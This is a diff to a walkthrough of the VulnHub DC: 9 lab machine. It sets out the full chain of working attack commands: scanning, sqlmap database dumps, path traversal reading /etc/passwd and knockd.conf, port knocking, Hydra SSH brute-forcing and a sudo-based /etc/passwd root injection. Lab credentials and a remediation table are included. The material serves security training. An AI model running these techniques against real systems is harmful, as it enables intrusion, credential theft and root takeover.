@@ -1,158 +1,186 @@
 # DC: 9 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.8 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.8 |
 | **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | /root/thefinalflag.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/dc-9,412/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/dc-9-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → SQLi in search form → LFI on welcome.php → /etc/knockd.conf → port knocking → Hydra SSH brute → janitor secrets → fredf creds → sudo test → /etc/passwd append → root
+DC: 9 is a medium-difficulty VulnHub machine. The web application has an SQL injection vulnerability in its search form that exposes usernames, passwords, and port-knocking configuration via local file inclusion. SSH is protected by port knocking; the knock sequence is retrieved from `/etc/knockd.conf` through the LFI. Credential brute-forcing via Hydra finds a valid SSH user (`janitor`). Lateral movement to `fredf` exploits a hidden password list found in a dot directory. `fredf` can run a Python script as root via sudo that appends arbitrary content to arbitrary files, allowing `/etc/passwd` manipulation to create a root-level user.
 
 ## Methodology
 
-1. Network scan — SSH filtered, port 80 open
-2. SQL injection in search → dump Staff + users DB
-3. LFI in welcome.php → read /etc/knockd.conf
-4. Port knocking to open SSH
-5. Hydra brute-force SSH → janitor credentials
-6. janitor hidden secrets → more passwords → fredf creds
-7. fredf `sudo test` → append root user to /etc/passwd
+1. Host discovery and port scan
+2. Web application analysis — search form SQL injection
+3. sqlmap — dump Staff and users databases
+4. Admin login — LFI discovery
+5. LFI to read `/etc/knockd.conf` — port knock sequence
+6. Port knocking — open SSH
+7. Hydra credential brute-force — SSH access as `janitor`
+8. Hidden directory — additional password list
+9. SSH as `fredf` — sudo misconfiguration exploitation
+10. Append malicious entry to `/etc/passwd` — root shell
 
----
-
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
+netdiscover -r 192.168.1.0/24
+```
+
+Target identified at `192.168.1.8`.
+
+```bash
 nmap -A 192.168.1.8
 ```
 
-Port 22 (SSH) filtered. Port 80 open (Apache, Drupal-styled web app).
+![nmap](images/01-nmap.png)
 
-![Nmap results](images/01-nmap.png)
+**Open ports:**
 
----
+| Port | Service | Note |
+|---|---|---|
+| 22 | SSH | filtered |
+| 80 | HTTP (Apache) | open |
 
-## Step 2: SQL Injection (Search Form)
+Port 22 is filtered, suggesting port knocking.
 
-Find the search form on the web app. Capture the POST request in Burp Suite, save to `raj.txt`.
+## Step 2: SQL Injection — Database Enumeration
+
+The web application has a search form. Capture the search request with Burp Suite and save it to `raj.txt`. Run sqlmap:
 
 ```bash
-# Enumerate databases
 sqlmap -r raj.txt --dbs --batch
-# Databases: Staff, users, information_schema
-
-# Dump Staff (admin password)
-sqlmap -r raj.txt -D Staff --dump-all --batch
-# admin hash → crack → admin password
-
-# Dump users (SSH credentials)
-sqlmap -r raj.txt -D users --dump-all --batch
-# UserDetails table: usernames + passwords
 ```
 
-![SQL injection](images/02-sqli.png)
+Two databases identified: `Staff` and `users`.
 
-Log in as admin. The footer shows a "File does not exist" error — indicates an LFI vulnerability.
-
----
-
-## Step 3: Local File Inclusion + Port Knock Discovery
-
-Test the `file` parameter on `welcome.php`:
+Dump both:
 
 ```bash
-# Confirm LFI
-http://192.168.1.8/welcome.php?file=../../../../../../../etc/passwd
+sqlmap -r raj.txt -D Staff --dump-all --batch
+sqlmap -r raj.txt -D users --dump-all --batch
+```
 
-# Read knockd config (port knocking sequence)
+![enumeration](images/02-enum.png)
+
+**Staff database:** Admin account with MD5 hash — cracks to `transorbital1`.
+
+**users database:** UserDetails table with multiple usernames and plaintext passwords (for SSH brute-forcing later).
+
+## Step 3: Admin Login and LFI Discovery
+
+Log in to the web application as `admin:transorbital1`. The footer shows a "file does not exist" error after login, indicating a file inclusion function. Test path traversal:
+
+```
+http://192.168.1.8/welcome.php?file=../../../../../../../etc/passwd
+```
+
+LFI confirmed. Read the port-knocking configuration:
+
+```
 http://192.168.1.8/welcome.php?file=../../../../../../../etc/knockd.conf
 ```
 
-knockd.conf reveals the sequence: **7469 → 8475 → 9842**
+**Port knock sequence extracted: 7469, 8475, 9842**
 
-![LFI and knockd](images/03-lfi-knockd.png)
+## Step 4: Port Knocking and SSH Brute-Force
 
----
-
-## Step 4: Port Knocking → SSH Open
+Send the knock sequence to open SSH:
 
 ```bash
 knock 192.168.1.8 7469 8475 9842
 nmap -p22 192.168.1.8
-# Port 22 now OPEN
+# Port 22 now open
 ```
 
----
+![exploit](images/03-exploit.png)
 
-## Step 5: SSH Brute-Force (Hydra)
-
-Build wordlists from the `users` database dump:
+Create wordlists from the users database dump and run Hydra:
 
 ```bash
 hydra -L user.txt -P pass.txt 192.168.1.8 ssh
-# Found: janitor:<password>
+```
 
+**Valid credential found: `janitor:Ilovepeepee`**
+
+## Step 5: SSH Access and Lateral Movement
+
+```bash
 ssh janitor@192.168.1.8
 ls -al
-# Hidden directory: secrets-for-putin
-cat secrets-for-putin/<file>
-# Additional passwords → add to pass.txt
-
-# Re-run Hydra
-hydra -L user.txt -P pass.txt 192.168.1.8 ssh
-# Found: fredf:<password>
 ```
 
----
+![shell](images/04-shell.png)
 
-## Step 6: Privilege Escalation (sudo test → /etc/passwd)
+A hidden directory `secrets-for-putin` contains a file with additional passwords written on sticky notes. Add these to `pass.txt` and run Hydra again:
 
 ```bash
-ssh fredf@192.168.1.8
-sudo -l
-# (root) NOPASSWD: /opt/devstuff/dist/test/test
-
-cat /opt/devstuff/dist/test/test.py
-# Appends contents of file1 to file2
-
-# Generate password hash for new root user
-openssl passwd -1 -salt pavan 123456
-# $1$pavan$qv9M3fBmtDPrOTBZflNl81
-
-# Create entry for root-level user
-echo 'pavan:$1$pavan$qv9M3fBmtDPrOTBZflNl81:0:0::/root:/bin/bash' > /tmp/raj
-
-# Append to /etc/passwd via sudo
-sudo /opt/devstuff/dist/test/test /tmp/raj /etc/passwd
-
-# Switch to new root user
-su pavan  # password: 123456
-whoami    # root
+hydra -L user.txt -P pass.txt 192.168.1.8 ssh
 ```
 
-![Privesc](images/04-privesc.png)
+**Additional valid credential found: `fredf:B4-Tru3-001`**
 
-![Root](images/05-root.png)
+```bash
+su fredf
+sudo -l
+```
 
----
+`fredf` can run `/opt/devstuff/test` as root without a password. Inspecting `/opt/devstuff/test.py`:
+
+```python
+# Appends contents of file1 to file2
+```
+
+## Step 6: Privilege Escalation — /etc/passwd Injection
+
+Generate a password hash for a new root-level user:
+
+```bash
+openssl passwd -1 -salt pavan 123456
+# Output: $1$pavan$qv9M3fBmtDPrOTBZflNl81
+```
+
+Write the new user entry to a temp file:
+
+```bash
+echo 'pavan:$1$pavan$qv9M3fBmtDPrOTBZflNl81:0:0::/root:/bin/bash' >> /tmp/raj
+```
+
+Append it to `/etc/passwd` using the sudo-allowed script:
+
+```bash
+sudo /opt/devstuff/test /tmp/raj /etc/passwd
+```
+
+Switch to the new root user:
+
+```bash
+su pavan
+# password: 123456
+whoami
+# root
+cat /root/flag.txt
+```
+
+![root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **SQLi in search forms** exposes entire databases including credential tables
-2. **LFI combined with port-knocking config** leaks the sequence to open filtered services
-3. **sudo with file-append scripts** allows writing arbitrary content to /etc/passwd — breaks privilege model
-4. Never store SSH credentials in a database accessible via SQLi
+- SQL injection in a search form cascaded into full database compromise, LFI exploitation, and ultimately system access. Input validation at the application layer is non-negotiable.
+- Storing port-knocking configuration in a file readable via LFI defeats the security control entirely.
+- A sudo rule that lets a low-privileged user run a file-appending script as root is equivalent to giving that user write access to every file on the system.
+- Reusing passwords across multiple services allowed pivot from one compromised account to another.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| SQL injection | Use parameterized queries; input validation |
-| Local File Inclusion (welcome.php) | Whitelist allowed file paths; never pass user input directly to include() |
-| Port knocking secret in /etc/knockd.conf | Restrict permissions on knockd.conf (0600, root) |
-| sudo test with file write | Remove NOPASSWD sudo or restrict to non-system paths |
+|---|---|
+| SQL injection in search form | Use parameterized queries; sanitize all user input |
+| Local File Inclusion | Validate and whitelist file parameter values; disable `allow_url_include` |
+| Port knock config readable via LFI | Store sensitive configs outside the web-accessible path |
+| Unsafe sudo rule (file-append script) | Remove the sudo rule; apply principle of least privilege |
+| Password reuse | Enforce unique credentials per account; use a password manager |
